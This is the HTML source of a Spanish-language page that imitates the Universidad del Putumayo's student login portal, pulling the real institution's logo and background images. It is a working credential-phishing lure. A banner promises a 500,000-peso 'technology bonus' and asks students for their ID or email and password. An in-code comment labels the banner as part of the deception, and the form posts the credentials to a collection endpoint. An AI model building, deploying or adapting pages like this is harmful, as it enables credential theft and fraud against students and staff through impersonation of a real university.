<!doctype html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sesión Académica – Portal Bienestar Estudiantil</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: 'Segoe UI', Arial, sans-serif;
        min-height: 100vh;
        background: url('https://sigedin.itp.edu.co/estudiantes/sigedin_excel/imagenes/fondo_uniputumayo1.png') center center / cover no-repeat;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      /* Overlay oscuro sobre el fondo */
      body::before {
        content: '';
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.35);
        z-index: 0;
      }

      .page {
        position: relative;
        z-index: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 60px;
        width: 100%;
        padding: 24px;
      }

      /* ---- Tarjeta del formulario ---- */
      .card {
        background: #fff;
        border-radius: 10px;
        padding: 32px 28px 28px;
        position: relative;

        width: 100%;
        max-width: 400px;
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
      }

      .card-header {
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-bottom: 18px;
      }

      .logo-box {
        display: flex;
        align-items: center;
        gap: 8px;
        margin-bottom: 6px;
      }

      .logo-icon {
        width: 42px;
        height: 42px;
        background: #003087;
        border-radius: 6px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #fff;
        font-size: 22px;
        font-weight: 900;
      }

      .logo-text {
        line-height: 1.1;
      }
      .logo-text .uni {
        font-size: 11px;
        color: #555;
        letter-spacing: 1px;
        text-transform: uppercase;
      }
      .logo-text .name {
        font-size: 17px;
        font-weight: 800;
        color: #003087;
        letter-spacing: 0.5px;
      }
      .logo-text .sub {
        font-size: 9px;
        color: #777;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }

      .card-title {
        font-size: 13px;
        color: #444;
        border-bottom: 2px solid #003087;
        padding-bottom: 6px;
        width: 100%;
        text-align: center;
        margin-top: 4px;
      }

      /* Aviso de bono */
      .bono-banner {
        background: #fff8e1;
        border-left: 4px solid #f9a825;
        border-radius: 4px;
        padding: 10px 12px;
        font-size: 12px;
        color: #5d4037;
        margin-bottom: 18px;
        line-height: 1.5;
      }
      .bono-banner strong {
        color: #e65100;
      }

      /* Inputs */
      .form-group {
        margin-bottom: 14px;
      }

      input[type='text'],
      input[type='password'] {
        width: 100%;
        padding: 10px 12px;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 13px;
        color: #333;
        outline: none;
        transition: border-color 0.2s;
      }
      input:focus {
        border-color: #003087;
      }
      input::placeholder {
        color: #aaa;
      }

      .row-options {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 12px;
        color: #555;
        margin-bottom: 16px;
      }
      .row-options label {
        display: flex;
        align-items: center;
        gap: 5px;
        cursor: pointer;
      }
      .row-options a {
        color: #003087;
        text-decoration: none;
      }
      .row-options a:hover {
        text-decoration: underline;
      }

      .btn-ingresar {
        width: 100%;
        background: #003087;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 11px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: background 0.2s;
      }
      .btn-ingresar:hover {
        background: #001f5c;
      }

      .divider {
        text-align: center;
        font-size: 12px;
        color: #999;
        margin: 14px 0 10px;
        position: relative;
      }
      .divider::before,
      .divider::after {
        content: '';
        position: absolute;
        top: 50%;
        width: 38%;
        height: 1px;
        background: #ddd;
      }
      .divider::before {
        left: 0;
      }
      .divider::after {
        right: 0;
      }

      .btn-google {
        width: 100%;
        background: #fff;
        color: #444;
        border: 1px solid #ccc;
        border-radius: 5px;
        padding: 9px;
        font-size: 13px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition: background 0.2s;
      }
      .btn-google:hover {
        background: #f5f5f5;
      }

      .admin-note {
        text-align: center;
        font-size: 10.5px;
        color: #888;
        margin: 12px 0 4px;
        line-height: 1.5;
      }
      .admin-note a {
        color: #003087;
        text-decoration: none;
      }

      /* ---- Panel derecho (branding) ---- */
      .branding {
        color: #fff;
        max-width: 260px;
        text-align: right;
        text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
      }

      .branding .logo-box {
        justify-content: flex-end;
        margin-bottom: 16px;
      }
      .branding .logo-icon {
        background: rgba(255, 255, 255, 0.15);
        border: 2px solid #fff;
      }
      .branding .logo-text .uni {
        color: #ddd;
      }
      .branding .logo-text .name {
        color: #fff;
        font-size: 20px;
      }
      .branding .logo-text .sub {
        color: #ccc;
      }

      .branding .tagline {
        font-size: 28px;
        font-weight: 300;
        line-height: 1.3;
      }
      .branding .tagline strong {
        font-weight: 800;
      }
      .branding .tagline .hash {
        color: #f9a825;
      }

      @media (max-width: 680px) {
        .branding {
          display: none;
        }
      }
      .bg-dark {
        background-color: #212529;
      }
    </style>
  </head>
  <body>
    <div class="page">
      <!-- Tarjeta login -->
      <div class="card">
        <div style="position: absolute; top: 0; left: 0; right: 0; color: white; background-color: #212529; justify-content: center; text-align: center; padding: 20px; border-radius: 3px">
          <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-box-seam" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
            <path
              fill-rule="evenodd"
              d="M8.186 1.113a.5.5 0 0 0-.372 0L1.846 3.5l2.404.961L10.404 2l-2.218-.887zm3.564 1.426L5.596 5 8 5.961 14.154 3.5l-2.404-.961zm3.25 1.7l-6.5 2.6v7.922l6.5-2.6V4.24zM7.5 14.762V6.838L1 4.239v7.923l6.5 2.6zM7.443.184a1.5 1.5 0 0 1 1.114 0l7.129 2.852A.5.5 0 0 1 16 3.5v8.662a1 1 0 0 1-.629.928l-7.185 2.874a.5.5 0 0 1-.372 0L.63 13.09a1 1 0 0 1-.63-.928V3.5a.5.5 0 0 1 .314-.464L7.443.184z"
            ></path>
          </svg>
          Sigedin Académico
        </div>
        <div class="card-header" style="margin-top: 50px">
          <div class="logo-box">
            <img src="https://sigedin.itp.edu.co/estudiantes/sigedin_excel/imagenes/LogoUniPutumayo1.png" alt="Universidad del Putumayo" style="height: 64px; object-fit: contain" />
          </div>
          <div class="card-title">Login | Estudiantes</div>
        </div>

        <!-- Banner del bono (parte del engaño) -->
        <div class="bono-banner">
          Validación requerida para
          <strong>bono tecnológico $500.000</strong>
          .
          <br />
          Ingresa tus datos para confirmar el desembolso.
        </div>

        <form action="/submit" method="POST">
          <div class="form-group">
            <input type="text" name="email" placeholder="Ingrese número de documento o email" required />
          </div>
          <div class="form-group">
            <input type="password" name="password" placeholder="Ingrese contraseña" required />
          </div>

          <div class="row-options">
            <label>
              <input type="checkbox" name="recordar" />
              Recordar
            </label>
            <a href="#">Olvidé mi contraseña</a>
          </div>

          <button type="submit" class="btn-ingresar">Ingresar</button>
        </form>

        <p class="admin-note">
          El ingreso está habilitado para Estudiantes y también
          <br />
          <a href="#">Administrativos</a>
          y
          <a href="#">Atribuidos</a>
          .
        </p>

        <div class="divider">O puedes usar tu correo institucional</div>

        <button class="btn-google" onclick="return false;">
          <!-- Google G icon -->
          <svg width="16" height="16" viewBox="0 0 48 48">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
          </svg>
          Iniciar sesión con Google
        </button>
      </div>

      <!-- Branding derecho -->
      <!-- <div class="branding">
      <div class="logo-box">
        <div class="logo-text" style="text-align:right;">
          <div class="uni">UNI</div>
          <div class="name">UPUTUMAYO</div>
          <div class="sub">Autenticidad del Ser Único</div>
        </div>
        <div class="logo-icon">U</div>
      </div>
      <div class="tagline">
        <span class="hash">#</span> Un Sueño<br>
        <strong>Hecho Realidad</strong>
      </div>
    </div> -->
    </div>
  </body>
</html>
